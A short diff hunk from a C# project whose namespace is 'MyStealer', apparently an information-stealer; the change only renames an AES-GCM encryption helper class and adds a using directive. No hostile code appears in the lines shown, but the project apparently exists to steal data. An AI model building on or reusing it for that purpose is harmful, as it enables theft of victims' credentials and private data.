@@ -2,14 +2,14 @@
 using PInvoke;
 using static PInvoke.BCrypt;
 using System.Security.Cryptography;
+using System.Linq;
 
 namespace MyStealer
 {
-
     /// <summary>
     /// https://gist.github.com/lellis1936/4a0904f2029682583e93b27dfb2082c0
     /// </summary>
-    internal unsafe static class AesGcm
+    internal unsafe static class BCryptAesGcm
     {
         public static byte[] GcmEncrypt(byte[] pbData, byte[] pbKey, byte[] pbNonce, byte[] pbTag, byte[] pbAuthData = null)
         {
